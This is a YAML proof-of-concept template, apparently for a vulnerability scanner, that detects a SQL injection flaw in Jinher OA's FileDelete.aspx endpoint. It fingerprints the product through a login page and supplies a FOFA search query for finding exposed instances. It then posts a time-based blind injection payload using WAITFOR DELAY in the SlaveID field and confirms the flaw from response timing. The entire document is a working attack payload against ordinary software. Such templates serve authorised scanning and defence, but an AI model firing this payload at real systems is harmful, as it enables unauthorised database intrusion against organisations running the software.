id: poc-yaml-jinher-filedelete-aspx-sqli
info:
  name: 金和OA FileDelete.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(2,5)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: status_code == 200 && contains(body,"JHSoft")
- method: POST
  path: /c6/Jhsoft.Web.accept/FileDelete.aspx/
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: SlaveID=-1')WAITFOR/**/DELAY'0:0:{{.t1}}'--/Temp/
  expression: 'status_code == 200 &&

    body == "" &&

    duration > t1 &&

    duration < t2

    '
transport: http
